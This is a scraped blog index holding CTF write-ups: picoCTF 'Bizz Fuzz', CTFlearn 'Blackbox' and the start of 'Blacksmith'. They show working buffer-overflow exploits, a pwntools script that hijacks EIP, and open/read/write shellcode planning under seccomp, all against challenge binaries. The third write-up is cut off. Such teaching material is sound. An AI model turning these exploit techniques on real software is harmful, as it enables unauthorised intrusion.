Basically, it is playing FizzBuzz, which is a game where you need to say \u0026ldquo;fizzbuzz\u0026rdquo; if a number is a multiple of 15 (3 times 5), \u0026ldquo;fizz\u0026rdquo; if it is a multiple of 3, \u0026ldquo;buzz\u0026rdquo; if it is a multiple of 5 or the same number if it is not a multiple of 3 or 5.\nWe can try it in the Python REPL:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; get_some_data(5) 1? 1 2? 2 3? fizz 4? 4 5 \u0026gt;\u0026gt;\u0026gt; get_some_data(8) 1? 1 2? 2 3? fizz 4? 4 5? buzz 6? fizz 7? 7 8 \u0026gt;\u0026gt;\u0026gt; get_some_data(8) 1? 0 1 \u0026gt;\u0026gt;\u0026gt; get_some_data(8) 1? 1 2? 0 2 \u0026gt;\u0026gt;\u0026gt; get_some_data(8) 1? 1 2? 2 3? 0 3  Now we have a clearer idea of what the function does: we must follow the game until the end if we want to return the same number that it is passed as argument (param_1), or break the game at any other number if we need a different value to be returned.\nUnderstanding the program Let\u0026rsquo;s check again the first called function in main (shown above as well, FUN_0811d5b3):\nvoid FUN_0811d5b3() { int iVar1; iVar1 = get_some_data(4); if (iVar1 != 4) { FUN_081451af(); iVar1 = get_some_data(4); if (iVar1 != 4) { FUN_0812d430(); iVar1 = get_some_data(10); if (iVar1 != 10) { FUN_0812d430(); iVar1 = get_some_data(7); if (iVar1 != 7) { // more stuff } } } } }  This strange function will call get_some_data(4), and if the returning value is 4, we do not enter in the if clause and exit the strange function FUN_0811d5b3.\nThen we will go to another strange function (FUN_0811d941):\nvoid main() { setbuf(stdout,(char *) 0x0); FUN_0811d5b3(); FUN_0811d941(); puts(\"fizz\"); // more stuff }  Which is similar, but calling first get_some_data(7):\nvoid FUN_0811d941() { int iVar1; iVar1 = get_some_data(7); if (iVar1 != 7) { FUN_0814668f(); iVar1 = get_some_data(6); if (iVar1 != 6) { FUN_0811ead2(); iVar1 = get_some_data(5); if (iVar1 != 5) { // more stuff } } } }  If we pass these two strange functions, the program will print \u0026ldquo;fizz\u0026rdquo; in the command line. Let\u0026rsquo;s verify it:\n$ ./vuln 1? 1 2? 2 3? fizz 1? 1 2? 2 3? fizz 4? 4 5? buzz 6? fizz fizz 1?  Finding the Buffer Overflow vulnerability Alright, but we still need to find the Buffer Overflow. The description of the challenge says that there is only one.\nIf we check the functions called by the binary inside Glibc, we discover that only fgets and scanf (__isoc99_scanf) can read from standard input (stdin):\n$ readelf -r vuln Relocation section '.rel.dyn' at offset 0x3dc contains 3 entries: Offset Info Type Sym.Value Sym. Name 08155ff4 00000506 R_386_GLOB_DAT 00000000 __gmon_start__ 08155ff8 00000806 R_386_GLOB_DAT 00000000 stdin@GLIBC_2.0 08155ffc 00000a06 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 Relocation section '.rel.plt' at offset 0x3f4 contains 11 entries: Offset Info Type Sym.Value Sym. Name 0815600c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 08156010 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 08156014 00000307 R_386_JUMP_SLOT 00000000 fgets@GLIBC_2.0 08156018 00000407 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 0815601c 00000607 R_386_JUMP_SLOT 00000000 exit@GLIBC_2.0 08156020 00000707 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 08156024 00000907 R_386_JUMP_SLOT 00000000 fopen@GLIBC_2.1 08156028 00000b07 R_386_JUMP_SLOT 00000000 strnlen@GLIBC_2.0 0815602c 00000c07 R_386_JUMP_SLOT 00000000 __isoc99_scanf@GLIBC_2.7 08156030 00000d07 R_386_JUMP_SLOT 00000000 strncmp@GLIBC_2.0 08156034 00000e07 R_386_JUMP_SLOT 00000000 strtol@GLIBC_2.0  If we use Ghidra to find all references to fgets (this can be done going to .got.plt and right-clicking on fgets), we find a lot of weird functions that call fgets multiple times.\nFortunately, the first one that appears on the list actually prints the flag:\nvoid FUN_08048656() { char local_74[100]; FILE *local_10; local_10 = fopen(\"flag.txt\", \"r\"); fgets(local_74, 100, local_10); puts(local_74); /* WARNING: Subroutine does not return */ exit(0); }  So I renamed it as print_flag. Probably, this will be the function we need to call after exploiting the hidden buffer overflow (namely, point $eip to the address of print_flag, which is 0x08048656).\nThe rest of the functions that referenced fgets are weird but have a similar structure:\nvoid FUN_0804883a() { char local_42[50]; int local_10; local_10 = get_some_data(0x21); if (local_10 == 1) { fgets(local_42, 0x28, stdin); } if (local_10 == 2) { fgets(local_42, 0x10, stdin); } if (local_10 != 3) { if (local_10 == 4) { fgets(local_42, 0x27, stdin); } if (local_10 != 5 \u0026amp;\u0026amp; local_10 != 6) { if (local_10 == 7) { fgets(local_42, 0x24, stdin); } if (local_10 == 8) { fgets(local_42, 8, stdin); } if (local_10 != 9 \u0026amp;\u0026amp; local_10 != 10) { if (local_10 == 0xb) { fgets(local_42, 0x10, stdin); } if (local_10 != 0xc) { if (local_10 == 0xd) { fgets(local_42, 0x31, stdin); } if (local_10 == 0xe) { fgets(local_42, 0x1c, stdin); } if (local_10 != 0xf) { if (local_10 == 0x10) { fgets(local_42, 0x13, stdin); } if (local_10 == 0x11) { fgets(local_42, 0x1d, stdin); } if (local_10 != 0x12) { if (local_10 == 0x13) { fgets(local_42, 0x2c, stdin); } if (local_10 != 0x14 \u0026amp;\u0026amp; local_10 != 0x15) { if (local_10 == 0x16) { fgets(local_42, 0x18, stdin); } if (local_10 == 0x17) { fgets(local_42, 0x1a, stdin); } if (local_10 != 0x18 \u0026amp;\u0026amp; local_10 != 0x19) { if (local_10 == 0x1a) { fgets(local_42, 0x1a, stdin); } if (local_10 != 0x1b) { if (local_10 == 0x1c) { fgets(local_42, 9, stdin); } if (local_10 == 0x1d) { fgets(local_42, 6, stdin); } if (local_10 != 0x1e) { if (local_10 == 0x1f) { fgets(local_42, 0x32, stdin); } if (local_10 == 0x20) { fgets(local_42, 0x27, stdin); } } } } } } } } } } } }  If we arrive to one of these functions, we will have additional space to enter data. However, taking the previous weird function as an example, local_42 has a buffer of 50 bytes, and none of the fgets is reading more than 50 bytes, so there is no overflow.\nSince there are a lot of weird functions that use fgets and the challenge said that there is one buffer overflow, there must be a function where fgets reads more bytes than the buffer reserved for the local variable.\nTo find the vulnerable function, I exported all the decompiled source code from Ghidra (vuln.c) and used a Python script to extract lines that start with char local_ or contain fgets(local_. After that, I extracted the reserved buffer for the local variable and the buffer read by fgets using regular expressions. If the buffer read by fgets is greater than the reserved one, there is a buffer overflow, and hence, we print the name of the vulnerable function.\nThis is the Python script:\n#!/usr/bin/env python3 import re def main(): with open('vuln.c') as f: all_lines = f.read().splitlines() lines = [] for i, line in enumerate(all_lines): if line.startswith(' char local_') or 'fgets(local_' in line: lines.append((i, line.strip())) print('Parsed lines. Total:', len(lines), '/', len(all_lines)) i = 0 while i \u0026lt; len(lines): n, line = lines[i] if 'char local' in line: buffer = int(re.findall(r'char local_.. \\[(\\d+?)\\];', line)[0]) i += 1 _, next_line = lines[i] while 'fgets(local' in next_line and i \u0026lt; len(lines): used_buffer_str = re.findall( r'fgets\\(local_..,([x0-9a-f]+?),.*?\\);', next_line)[0] used_buffer = int( used_buffer_str, 16 if 'x' in used_buffer_str else 10) if used_buffer \u0026gt; buffer: print('Reserved:', buffer, 'B. Used:', used_buffer, 'B') print('Function name:', all_lines[n - 3]) i += 1 if i \u0026lt; len(lines): _, next_line = lines[i] if __name__ == '__main__': main()  If we run the script, we discover the vulnerable function:\n$ python3 find_bof.py Parsed lines. Total: 20369 / 119248 Reserved: 87 B. Used: 348 B Function name: void FUN_0808ae73()  Now we can go to Ghidra, find it and rename it as has_bof:\nvoid has_bof() { char local_67[87]; int local_10; local_10 = get_some_data(0x14); if (local_10 == 1) { fgets(local_67, 0x15c, stdin); } if (local_10 == 2) { fgets(local_67, 0x3e, stdin); } // more stuff }  Here we have the Buffer Overflow vulnerability, since the reserved buffer is 87 and fgets is reading 348 bytes (0x15c).\nOpening way to the vulnerable function Now we need to find references to this function, and there is only one weird function: FUN_08109f08. I decided to call it calls_has_bof:\nvoid calls_has_bof() { char local_67[87]; int local_10; local_10 = get_some_data(0x2e); if (local_10 == 1) { fgets(local_67, 0x44, stdin); } if (local_10 == 2) { fgets(local_67, 0x1c, stdin); } if (local_10 != 3) { if (local_10 == 4) { fgets(local_67, 0x43, stdin); } if (local_10 == 5) { has_bof(); } // more stuff } }  In order to arrive at has_bof from calls_has_bof we need get_some_data(0x2e) to return 5 (namely, lose the FizzBuzz game at number 5).\nNow we find references to calls_has_bof, and we have a strange function: FUN_081313b8, which I called calls_calls_has_bof (I will not show it because the reference to the function is in \u0026ldquo;depth 22\u0026rdquo;, I will explain it later).\nAfter that, we look for references to calls_calls_has_bof, and there is another strange function: FUN_08143ffd, which I renamed to calls_calls_calls_has_bof. The reference is in \u0026ldquo;depth 1\u0026rdquo;:\nvoid calls_calls_calls_has_bof() { int iVar1; iVar1 = get_some_data(0x11); if (iVar1 != 0x11) { FUN_0811ead2(); iVar1 = get_some_data(5); if (iVar1 != 5) { calls_calls_has_bof(); iVar1 = get_some_data(0xf); // more stuff } } }  Hopefully, you may have notice what \u0026ldquo;depth 1\u0026rdquo; is: once we are in calls_calls_calls_has_bof, we need to enter in the first if clause (losing the FizzBuzz game), exit from the strange function FUN_0811ead2 (winning the FizzBuzz game) and then enter in the second if clause (losing the FizzBuzz game) in order to enter calls_calls_has_bof.\nSo, \u0026ldquo;depth 1\u0026rdquo; means that we need to pass one strange function (in this case, FUN_0811ead2).\nWe continue by finding references to calls_calls_calls_has_bof. Here we can find four strange functions, I chose FUN_0813ca30, which was renamed to calls_calls_calls_calls_has_bof (unexpectedly). This one is \u0026ldquo;depth 8\u0026rdquo;.\nFinally, if we find references to calls_calls_calls_calls_has_bof, we get to main:\nvoid main() { setbuf(stdout,(char *)0x0); FUN_0811d5b3(); FUN_0811d941(); puts(\"fizz\"); FUN_0811ead2(); puts(\"buzz\"); puts(\"fizz\"); FUN_0811fbb3(); FUN_08120828(); puts(\"fizz\"); puts(\"buzz\"); FUN_08121d33(); puts(\"fizz\"); FUN_08122908(); FUN_08122ea8(); puts(\"fizzbuzz\"); FUN_081237e9(); FUN_081241ca(); puts(\"fizz\"); FUN_081255ef(); puts(\"buzz\"); puts(\"fizz\"); FUN_08127392(); FUN_08127c08(); puts(\"fizz\"); puts(\"buzz\"); FUN_081294b8(); puts(\"fizz\"); FUN_0812a7b4(); FUN_0812b0ae(); puts(\"fizzbuzz\"); FUN_0812c368(); FUN_0812c6f6(); puts(\"fizz\"); FUN_0812d430(); puts(\"buzz\"); puts(\"fizz\"); FUN_0812edb3(); FUN_0812f1b9(); puts(\"fizz\"); puts(\"buzz\"); FUN_081309d7(); puts(\"fizz\"); FUN_08131dba(); FUN_08132072(); puts(\"fizzbuzz\"); FUN_0813282a(); FUN_0813326e(); puts(\"fizz\"); FUN_08133b70(); puts(\"buzz\"); puts(\"fizz\"); FUN_08135115(); FUN_081355d3(); puts(\"fizz\"); puts(\"buzz\"); FUN_08137124(); puts(\"fizz\"); FUN_08137f92(); FUN_08138931(); puts(\"fizzbuzz\"); FUN_0813979b(); FUN_08139ba1(); puts(\"fizz\"); FUN_0813ac2a(); puts(\"buzz\"); puts(\"fizz\"); calls_calls_calls_calls_has_bof(); // more stuff }  Alright. For the moment, we have discovered the function we want to call (print_flag), the vulnerable function (has_bof) and the path to that function. Now we need to automate the process.\nFirst, we will automate the process of arriving at calls_calls_calls_calls_has_bof inside main:\nmessages = [...] def pass_messages(p): while len(messages): data = p.recvuntil(b'? ').decode().splitlines() if len(data) \u0026gt;= 2: if data[0] != messages.pop(0): log.error('Unexpected message') if len(data) == 3: if data[1] != messages.pop(0): log.error('Unexpected message') number = int(data[-1].rstrip('? ')) p.sendline(answer(number))  The function pass_messages uses a list of expected messages (all the data printed by the program: \u0026ldquo;fizz\u0026rdquo;, \u0026ldquo;buzz\u0026rdquo;, \u0026ldquo;fizz\u0026rdquo;, \u0026ldquo;fizz\u0026rdquo;, \u0026ldquo;buzz\u0026rdquo;, \u0026ldquo;fizz\u0026rdquo;, \u0026ldquo;fizzbuzz\u0026rdquo; and so on until arriving to calls_calls_calls_calls_has_bof, in order).\nThe way to check that everything is correct is taking the received data from the process p and remove the expected messages from the list if they match (if not, something wrong has happened). The task is held until there are no more messages.\nThe answer function does the FizzBuzz stuff:\ndef answer(n: int) -\u0026gt; bytes: if n % 15 == 0: return b'fizzbuzz' if n % 3 == 0: return b'fizz' if n % 5 == 0: return b'buzz' return str(n).encode()  Once passed all messages, we enter inside calls_calls_calls_calls_has_bof.\nIn order to enter inside the next function (calls_calls_calls_has_bof), we need to pass 8 strange functions (\u0026ldquo;depth 8\u0026rdquo;). Let\u0026rsquo;s define this functionality:\ndef get_number(p) -\u0026gt; int: return int(p.recvuntil(b'? ').decode().rstrip('? ')) def pass_function(p): number = get_number(p) p.sendline(answer(number)) while (number := get_number(p)) != 1: p.sendline(answer(number)) def pass_functions(p, depth: int): p.sendlineafter(b'? ', b'0') for _ in range(depth): pass_function(p) p.sendline(b'0') log.info(f'Passed {depth} function' + ('s' if depth \u0026gt; 1 else ''))  Basically, what pass_functions does is the process shown before with the \u0026ldquo;depth 1\u0026rdquo; example. We send a 0 to lose the FizzBuzz game, then we win the next game and fail the next one. This task is repeated depth times, in order to enter in the next desired function.\nTo summarize:\n calls_calls_calls_calls_has_bof calls calls_calls_calls_has_bof with \u0026ldquo;depth 8\u0026rdquo; calls_calls_calls_has_bof calls calls_calls_has_bof with \u0026ldquo;depth 1\u0026rdquo; calls_calls_has_bof calls calls_has_bof with \u0026ldquo;depth 22\u0026rdquo; calls_has_bof calls has_bof if we return 5 from get_some_data has_bof calls vulnerable fgets if we return 1 from get_some_data  Exploit development So, we can write this main function for the Python exploit:\ndef main(): p = get_process() pass_messages(p) log.info('Passed messages') pass_functions(p, 8) pass_functions(p, 1) pass_functions(p, 22) for i in range(4): p.sendlineafter(b'? ', answer(i + 1)) p.sendlineafter(b'? ', b'0') log.info('Arrived to vulnerable fgets()') p.interactive(prompt='')  Let\u0026rsquo;s start with the exploitation process. If we run the script, we should get to the vulnerable fgets:\n$ python3 solve.py [+] Starting local process './vuln': pid 495650 [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [*] Switching to interactive mode 1? 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [*] Got EOF while reading in interactive [*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 495650) [*] Got EOF while sending in interactive  Nice, segmentation fault (SIGSEGV). Notice that I entered a 0 and 8 spaces before the A characters (because get_some_data reads 9 bytes).\nLet\u0026rsquo;s attach GDB to the process and calculate the offset to reach $eip. In order to break at the vulnerable fgets, we can find the address of the the call instruction to get_some_data inside has_bof in Ghidra (namely 0x0808ae8a). This can be added as a GDB script with pwntools:\ngdb.attach(p, gdbscript='break *0x0808ae8a\\ncontinue')  Now if we execute it, the Python script will call GDB:\n$ python3 solve.py [+] Starting local process './vuln': pid 496748 [*] running in new terminal: ['/usr/bin/gdb', '-q', './vuln', '496748', '-x', '/tmp/pwngwheh6z6.gdb'] [+] Waiting for debugger: Done [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [*] Switching to interactive mode  Now we have the control on GDB, we can create a pattern:\ngef➤ pattern create 200 [+] Generating a pattern of 200 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab [+] Saved as '$_gef0' gef➤ continue  And we return the control to the Python script. We can enter the 0, the 8 spaces and then the pattern:\n$ python3 solve.py [+] Starting local process './vuln': pid 496748 [*] running in new terminal: ['/usr/bin/gdb', '-q', './vuln', '496748', '-x', '/tmp/pwngwheh6z6.gdb'] [+] Waiting for debugger: Done [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [*] Switching to interactive mode 1? 0 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab  And we get the segmentation fault. Let\u0026rsquo;s check GDB:\ngef➤ pattern create 200 [+] Generating a pattern of 200 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab [+] Saved as '$_gef0' gef➤ continue Continuing. Program received signal SIGSEGV, Segmentation fault. 0x61617961 in ?? ()  At this point, we can get the offset needed to overwrite the $eip register:\ngef➤ pattern offset $eip [+] Searching for '$eip' [+] Found at offset 95 (little-endian search) likely [+] Found at offset 94 (big-endian search)  So, we need 95 characters to control $eip. Now, we can add the address of print_flag (0x08048656, which is static since there is no PIE protection) to the payload:\ndef main(): p = get_process() pass_messages(p) log.info('Passed messages') pass_functions(p, 8) pass_functions(p, 1) pass_functions(p, 22) for i in range(4): p.sendlineafter(b'? ', answer(i + 1)) p.sendlineafter(b'? ', b'0') log.info('Arrived to vulnerable fgets()') offset = 95 junk = b'A' * offset print_flag_addr = 0x08048656 payload = junk + p32(print_flag_addr) p.sendlineafter(b'? ', b'0' + b' ' * 8 + payload) log.success(f'Flag: {p.recvline().decode()}') p.close()  Let\u0026rsquo;s test it locally (we need to create a fake flag.txt):\n$ echo THISISTHEFLAG  flag.txt $ python3 solve.py [+] Starting local process './vuln': pid 504168 [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [+] Flag: THISISTHEFLAG [*] Process './vuln' stopped with exit code 0 (pid 504168)  Flag Perfect, let\u0026rsquo;s try it on the remote instance (it takes around one minute):\n$ python3 solve.py mercury.picoctf.net 62213 [+] Opening connection to mercury.picoctf.net on port 62213: Done [*] Passed messages [*] Passed 8 functions [*] Passed 1 function [*] Passed 22 functions [*] Arrived to vulnerable fgets() [+] Flag: picoCTF{y0u_found_m3} [*] Closed connection to mercury.picoctf.net port 62213  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/bizz-fuzz/","section":"ctf","summary":"picoCTF 2021. 500 points. 32-bit binary. Reversing. Long way to a hidden Buffer Overflow. Redirecting program execution","time":18,"title":"Bizz Fuzz"},{"contents":"We are given a server to connect using SSH. There is a binary called blackbox that is SGID:\nblackbox@ubuntu-512mb-nyc3-01:~$ ls -l total 16 ---x--s--x 1 root blackbox_pwn 8936 Jan 31 2019 blackbox -r--r----- 1 root blackbox_pwn 33 Oct 9 2017 flag.txt blackbox@ubuntu-512mb-nyc3-01:~$ file blackbox blackbox: setgid executable, regular file, no read permission  As it can be seen, we have no read permission, so we cannot transfer the file to our machine, or decompile it, or debug it. The only thing we can do is run it:\nblackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox What is 1 + 1 =  We have only that user input. If we answer the question, we get:\nblackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox What is 1 + 1 = 2 No dummy... 1 + 1 != 0...  If we fuzz this input using Python, we get a *** stack smashing detected *** message:\nblackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 100)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... *** stack smashing detected ***: \u0026lt;unknown\u0026gt; terminated [1]+ Stopped python3 -c 'print(\"A\" * 100)' | ./blackbox  So the binary has a stack canary that protects from buffer overflows. We can decrease the amount of characters until we find this behavior:\nblackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 80)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 0... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 81)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 65... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 82)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 16705... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 83)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 4276545... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 84)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 85)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 86)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 87)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 88)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... blackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 89)' | ./blackbox What is 1 + 1 = No dummy... 1 + 1 != 1094795585... *** stack smashing detected ***: \u0026lt;unknown\u0026gt; terminated [2]+ Stopped python3 -c 'print(\"A\" * 89)' | ./blackbox  If we take the numbers and print them in hexadecimal, we will see what is happening:\n\u0026gt;\u0026gt;\u0026gt; hex(65) '0x41' \u0026gt;\u0026gt;\u0026gt; hex(16705) '0x4141' \u0026gt;\u0026gt;\u0026gt; hex(4276545) '0x414141' \u0026gt;\u0026gt;\u0026gt; hex(1094795585) '0x41414141'  It seems clear that the result we need to enter \u0026quot;\\x02\u0026quot; where there is a single \u0026quot;A\u0026quot; (0x41). That is, we need to enter 80 characters and the next character must be \u0026quot;\\x02\u0026quot;, so that the question has a correct answer:\nblackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"A\" * 80 + \"\\x02\")' | ./blackbox What is 1 + 1 = CORRECT! You get flag: CTFlearn{0n3_4lus_1_1s_Tw0_dumm13!!} [3]+ Stopped python3 -c 'print(\"A\" * 80 + \"\\x02\")' | ./blackbox  Or even shorter:\nblackbox@ubuntu-512mb-nyc3-01:~$ python3 -c 'print(\"\\x02\" * 81)' | ./blackbox What is 1 + 1 = CORRECT! You get flag: CTFlearn{0n3_4lus_1_1s_Tw0_dumm13!!} [3]+ Stopped python3 -c 'print(\"\\x02\" * 81)' | ./blackbox  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/binary/blackbox/","section":"ctf","summary":"Blackbox testing. No debugging, no source code, no assembly","time":3,"title":"Blackbox"},{"contents":"We are given a 64-bit binary called blacksmith:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments  If we open it in Ghidra, we will see this main function:\nvoidmain() { size_tlength; longin_FS_OFFSET; intanswer; intoption; char*message_1; char*message_2; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); setup(); message_1 =\"You are worthy to carry this Divine Weapon and bring peace to our homeland!\\n\"; message_2 =\"This in not a weapon! Do not try to mock me!\\n\"; puts(\"Traveler, I need some materials to fuse in order to create something really powerful!\"); printf(\"Do you have the materials I need to craft the Ultimate Weapon?\\n1. Yes, everything is here! \\n2. No, I did not manage to bring them all!\\n\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;answer); if(answer !=1) { puts(\"Farewell traveler! Come back when you have all the materials!\"); /* WARNING: Subroutine does not return */ exit(0x22); } printf(\u0026amp;menu); __isoc99_scanf(\"%d\", \u0026amp;option); sec(); if(option ==1) { sword(); } elseif(option ==2) { shield(); } elseif(option ==3) { bow(); } else{ length =strlen(message_2); write(1, message_2, length); /* WARNING: Subroutine does not return */ exit(0x105); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  It shows a menu with some options:\n$ ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 2 Farewell traveler! Come back when you have all the materials! $ ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 1 What do you want me to craft? 1. 🗡 2. 🛡 3. 🏹 \u0026gt; 1 This sword can cut through anything! The only thing is, that it is too heavy carry it.. zsh: invalid system call ./blacksmith $ ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 1 What do you want me to craft? 1. 🗡 2. 🛡 3. 🏹 \u0026gt; 3 This bow's range is the best! Too bad you do not have enough materials to craft some arrows too.. zsh: invalid system call ./blacksmith $ ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 1 What do you want me to craft? 1. 🗡 2. 🛡 3. 🏹 \u0026gt; 2 Excellent choice! This luminous shield is empowered with Sun's light! ☀ It will protect you from any attack and it can reflect enemies attacks back! Do you like your new weapon? \u0026gt; yes zsh: segmentation fault ./blacksmith  The only option where we can enter data is shield (option 2):\nvoidshield() { size_tlength; longin_FS_OFFSET; undefined shellcode [72]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); length =strlen(message); write(1, message, length); length =strlen(\"Do you like your new weapon?\\n\u0026gt; \"); write(1, \"Do you like your new weapon?\\n\u0026gt; \", length); read(0, shellcode, 63); (*(code *) shellcode)(); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Basically, we have the chance to enter machine code instructions that will be executed. We can enter up to 63 bytes. However, we are limited by sec, which implements some seccomp rules to allow specific syscall instructions:\nvoidsec() { undefined8 rules; longin_FS_OFFSET; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); prctl(0x26, 1); prctl(4, 0); rules =seccomp_init(0); seccomp_rule_add(rules, 0x7fff0000, 2, 0); seccomp_rule_add(rules, 0x7fff0000, 0, 0); seccomp_rule_add(rules, 0x7fff0000, 1, 0); seccomp_rule_add(rules, 0x7fff0000, 0x3c, 0); seccomp_load(rules); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  In order to enumerate these seccomp rules, we can use seccomp-tools:\n$ seccomp-tools dump ./blacksmith Traveler, I need some materials to fuse in order to create something really powerful! Do you have the materials I need to craft the Ultimate Weapon? 1. Yes, everything is here! 2. No, I did not manage to bring them all! \u0026gt; 1 What do you want me to craft? 1. 🗡 2. 🛡 3. 🏹 \u0026gt; 2 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u0026lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002 if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL  So, we are allowed to use sys_read, sys_write, sys_open and sys_exit. There are quite a few websites that list all Linux x86_64 syscall instructions with the needed parameters and register configuration. For example, this one.\nWith the allowed syscall instructions, we can open the flag file (flag.txt) with sys_open, read the file descriptor with sys_read and write the output into the stdout file descriptor with sys_write. Additionally, we can exit with sys_exit.\nSo, sys_open needs the following register setup:\n $rax = 2 $rdi has a pointer to the filename string $rsi has some flags $rdx has the mode of operation (this one can be omitted)  Specifically, we can go to man7.org and learn more about the meaning of the parameters:\nintopen(constchar*pathname, intflags);  Once we have sys_open set, we will receive the file descriptor of the flag file as the return value in $rax. It will be the time to use sys_read:\n $rax = 0 $rdi has the file descriptor (the one returned by sys_open) $rsi has the address where to store the read data $rdx has the count of bytes to read (for example, 100)  ssize_tread(intfd, void*buf, size_tcount); Finally, we will write the above contents to stdout using sys_write:\n $rax = 1 $rdi has the file descriptor (1 for stdout) $rsi has the address where to get the data $rdx has the count of bytes to write (for example, 100)  ssize_twrite(intfd, constvoid*buf, size_tcount);  For people that have not written any assembly, it might be useful to write a C program with the above setup, compile it and analyze the generated assembly instructions:\n#include\u0026lt;fcntl.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; voidmain() { intfd; chardata[256]; fd =open(\"./flag.txt\", O_RDONLY); read(fd, data, 100); write(1, data, 100); exit(0); }  $ gcc test.c -O3 -o test test.c: In function ‘main’: test.c:10:2: warning: ignoring return value of 